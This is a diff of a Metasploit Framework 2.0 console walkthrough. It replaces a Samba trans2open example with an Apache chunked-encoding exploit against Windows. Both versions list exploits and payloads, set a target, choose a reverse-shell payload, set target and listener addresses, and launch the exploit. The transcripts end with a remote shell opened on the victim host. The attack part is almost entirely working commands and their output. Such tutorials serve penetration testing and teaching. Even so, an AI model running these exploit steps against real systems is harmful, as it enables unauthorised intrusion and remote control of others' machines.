@@ -1,171 +1,180 @@
 1) Start up the console
 
-hdm@ice framework-v2.0 $ ./msfconsole
-msfconsole: load: loaded configuration from /home/hdm/.msfconsole
+hdm@slasher framework $ ./msfconsole
+                                                                                                                
++ -- --=[ msfconsole v2.0 [15 exploits - 19 payloads]
+                                                                                                                
+msf >
 
-+ -- --=[ msfconsole v2.0 [12 exploits - 16 payloads]
-
-msf > 
 
 
 2) Show available exploits
 
 msf > show exploits
-
+                                                                                                                
 Metasploit Framework Loaded Exploits
 ====================================
+                                                                                                                
+  PoPToP_Negative_Read         PoPToP Negative Read Overflow
+  apache_chunked_win32         Apache Win32 Chunked Encoding
+  exchange2000_xexch50         Exchange 2000 MS03-46 Heap Overflow
+  frontpage_fp30reg_chunked    Frontpage fp30reg.dll Chunked Encoding
+  ia_webmail                   IA WebMail 3.x Buffer Overflow
+  iis50_nsiislog_post          IIS 5.0 nsiislog.dll POST Overflow
+  iis50_printer_overflow       IIS 5.0 Printer Buffer Overflow
+  iis50_webdav_ntdll           IIS 5.0 WebDAV ntdll.dll Overflow
+  msrpc_dcom_ms03_026_win2kxp  Microsoft RPC DCOM MSO3-026 NT 2K/XP
+  msrpc_dcom_ms03_026_winnt    Microsoft RPC DCOM MSO3-026 NT 4.0
+  mssql2000_resolution         MSSQL 2000 Resolution Overflow
+  realserver_describe_linux    RealServer Describe Buffer Overflow
+  samba_trans2open             Samba trans2open Overflow
+  solaris_sadmind_exec         Solaris sadmind Remote Exec
+  warftpd_165_pass             War-FTPD 1.65 PASS Overflow
 
-  apache_chunked_win32          Apache Win32 Chunked Encoding
-  exchange2000_xexch50          Exchange 2000 MS03-46 Heap Overflow
-  frontpage_fp30reg_chunked     Frontpage fp30reg.dll Chunked Encoding
-  iis50_nsiislog_post           IIS 5.0 nsiislog.dll POST Overflow
-  iis50_printer_overflow        IIS 5.0 Printer Buffer Overflow
-  iis50_webdav_ntdll            IIS 5.0 WebDAV ntdll.dll Overflow
-  msrpc_dcom_ms03_026_win2kxp   Microsoft RPC DCOM MSO3-026 NT 2K/XP
-  msrpc_dcom_ms03_026_winnt     Microsoft RPC DCOM MSO3-026 NT 4.0
-  mssql2000_resolution          MSSQL 2000 Resolution Overflow
-  samba_trans2open              Samba trans2open Overflow
-  solaris_sadmind_exec          Solaris sadmind Remote Exec
-  warftpd_165_pass              War-FTPD 1.65 PASS Overflow
 
 
 3) Show available payloads
 
-msf > show payloads 
-
+msf > show payloads
+                                                                                                                
 Metasploit Framework Loaded Payloads
 ====================================
-
-  bsdx86bind                    Listen for connection and spawn a shell
-  bsdx86bind_lsd                Listen for connection and spawn a shell
-  bsdx86findsock                Spawn a shell on the established connection
-  bsdx86reverse                 Connect back to attacker and spawn a shell
-  linx86bind                    Listen for connection and spawn a shell
-  linx86findsock                Spawn a shell on the established connection
-  linx86reverse                 Connect back to attacker and spawn a shell
-  linx86reverse_ie              Connect back to attacker and spawn a shell
-  linx86reverse_imp             Connect back to attacker and download impurity module
-  linx86reverse_xor_ie          Connect back to attacker and spawn an encrypted shell
-  solx86bind                    Listen for connection and spawn a shell
-  solx86findsock                Spawn a shell on the established connection
-  solx86reverse                 Connect back to attacker and spawn a shell
-  winadduser                    Create admin user X with pass X
-  winbind                       Listen for connection and spawn a shell
-  winreverse                    Connect back to attacker and spawn a shell
-
-
-5) Show current configuration
-
-msf > show config
-
-Metasploit Framework Configuration
-====================================
-
-  CONFDIR                       /home/hdm/.msfconsole
-  LOGGING                       1
+                                                                                                                
+  bsdx86bind           Listen for connection and spawn a shell
+  bsdx86findsock       Spawn a shell on the established connection
+  bsdx86reverse        Connect back to attacker and spawn a shell
+  cmd_generic          Run a specific command on the remote system
+  cmd_sol_bind         Use inetd to create a persistent bindshell
+  cmd_unix_reverse     Use telnet|sh|telnet to simulate reverse shell
+  linx86bind           Listen for connection and spawn a shell
+  linx86bind_ie        Listen for connection and spawn a shell
+  linx86findsock       Spawn a shell on the established connection
+  linx86reverse        Connect back to attacker and spawn a shell
+  linx86reverse_ie     Connect back to attacker and spawn a shell
+  linx86reverse_imp    Connect back to attacker and download impurity module
+  linx86reverse_xor    Connect back to attacker and spawn an encrypted shell
+  solx86bind           Listen for connection and spawn a shell
+  solx86findsock       Spawn a shell on the established connection
+  solx86reverse        Connect back to attacker and spawn a shell
+  winadduser           Create admin user X with pass X
+  winbind              Listen for connection and spawn a shell
+  winreverse           Connect back to attacker and spawn a shell
 
 
-6) Enable or disable logging
+3) Select your favorite exploit
 
-msf > logging on
-msfconsole: logging: logging has been enabled
-
-
-7) Select your favorite exploits
-
-msf > use samba_trans2open 
-msf samba_trans2open > 
+msf > use apache_chunked_win32
+msf apache_chunked_win32 >
 
 
-8) Show available targets for this exploit
 
-msf samba_trans2open > show targets 
+4) Show available targets for this exploit
 
+msf apache_chunked_win32 > show targets
+                                                                                                                
 Supported Exploit Targets
 =========================
-
-  0     Linux x86
-  1     FreeBSD x86
-
-
-9) Select the appropriate target value
-
-msf samba_trans2open > set TARGET 0
-TARGET: 0
+                                                                                                                
+  0  Windows NT/2K Brute Force
+  1  Windows 2000
+  2  Windows NT
 
 
-10) Show payloads that work with this exploit
-msf samba_trans2open > show payloads 
 
+5) Select the appropriate target value
+
+msf apache_chunked_win32 > set TARGET 2
+TARGET -> 2
+
+
+
+6) Show payloads that work with this exploit
+
+msf apache_chunked_win32 > show payloads
+                                                                                                                
 Metasploit Framework Usable Payloads
 ====================================
-
-  bsdx86bind                    Listen for connection and spawn a shell
-  bsdx86bind_lsd                Listen for connection and spawn a shell
-  bsdx86findsock                Spawn a shell on the established connection
-  bsdx86reverse                 Connect back to attacker and spawn a shell
-  linx86bind                    Listen for connection and spawn a shell
-  linx86findsock                Spawn a shell on the established connection
-  linx86reverse                 Connect back to attacker and spawn a shell
-  linx86reverse_ie              Connect back to attacker and spawn a shell
-  linx86reverse_imp             Connect back to attacker and download impurity module
-  linx86reverse_xor_ie          Connect back to attacker and spawn an encrypted shell
+                                                                                                                
+  winadduser    Create admin user X with pass X
+  winbind       Listen for connection and spawn a shell
+  winreverse    Connect back to attacker and spawn a shell
 
 
-11) Select an appropriate payload for the target
 
-msf samba_trans2open > set PAYLOAD linx86reverse_xor_ie 
-PAYLOAD: linx86reverse_xor_ie
+7) Select your desired payload for the target
+
+msf apache_chunked_win32 > set PAYLOAD winreverse
+PAYLOAD -> winreverse
 
 
-12) Show available options
 
-msf samba_trans2open > show options 
+8) Show available options
 
+msf apache_chunked_win32 > show options
+                                                                                                                
 Exploit and Payload Options
-============================
+===========================
+                                                                                                                
+  Exploit:    Name      Default    Description
+  --------    ------    -------    ------------------
+  optional    SSL                  Use SSL
+  required    RHOST                The target address
+  required    RPORT     80         The target port
+                                                                                                                
+  Payload:    Name        Default    Description
+  --------    --------    -------    ------------------------------------------
+  optional    EXITFUNC    seh        Exit technique: "process", "thread", "seh"
+  required    LHOST                  Local address to receive connection
+  optional    PREFORK                Execute payload in forked process
+  required    LPORT                  Local port to receive connection
+                                                                                                                
 
-  required:             RHOST          The target address
-  required:             RPORT          The samba port
 
-  required:             LHOST          Local address to receive connection
-  required:             LPORT          Local port to receive connection
-  required:             XKEY           Byte to xor the connection with
+9) Show the optional advanced options
+
+msf apache_chunked_win32 > show advanced
+                                                                                                                
+Exploit and Payload Advanced Options
+====================================
+                                                                                                                
+  Payload (Msf::Payload::win32_reverse):
+  --------------------------------------
+                                                                                                                
+  Exploit (Msf::Exploit::apache_chunked_win32):
+  ---------------------------------------------
+
+(this exploit and payload set have no advanced options)
 
 
 
-13) Set all required options
+10) Set all required options
 
-msf samba_trans2open > set RHOST 192.168.0.100  
-RHOST: 192.168.0.100
-msf samba_trans2open > set RPORT 139 
-RPORT: 139
-msf samba_trans2open > set LHOST 192.168.0.247 
-LHOST: 192.168.0.247
-msf samba_trans2open > set LPORT 34334
-LPORT: 34334
-msf samba_trans2open > set XKEY 34
-XKEY: 34
+msf apache_chunked_win32 > set RHOST 192.168.1.241
+RHOST -> 192.168.1.241
+msf apache_chunked_win32 > set RPORT 8080
+RPORT -> 8080
+msf apache_chunked_win32 > set LHOST 192.168.1.244
+LHOST -> 192.168.1.244
+msf apache_chunked_win32 > set LPORT 4444
+LPORT -> 4444
+
 
 
 12) Perform a vulnerability check
 
-msf samba_trans2open > check
-msfconsole: check: No check has been implemented for this module
+msf apache_chunked_win32 > check
+[*] Vulnerable server 'Apache/1.3.22 (Win32)'
 
 
-13) Launch the actual exploit (finally) :)
 
-msf samba_trans2open > exploit
-msfconsole: exploit: starting handler reverse_shell_xor
-[*] Starting brute force mode...
-[*] Trying return address 0xbfffffdc
-[*] Trying return address 0xbffffddc
-[*] Trying return address 0xbffffbdc
-[*] Trying return address 0xbffff9dc
-[*] Trying return address 0xbffff7dc
-[*] Trying return address 0xbffff5dc
-[*] Connection from 192.168.0.100:1064...
+13) Launch the actual exploit :)
 
-sh: no job control in this shell
-sh-2.04# 
+msf apache_chunked_win32 > exploit
+[*] Trying to exploit Windows NT using return 0x1c0f1022 with padding of 348...
+[*] Trying to exploit Windows NT using return 0x1c0f1022 with padding of 352...
+[*] Connection from 192.168.1.241:1036...
+                                                                                                                
+Microsoft(R) Windows NT(TM)
+(C) Copyright 1985-1996 Microsoft Corp.
+                                                                                                                
+c:\program files\apache group\apache>
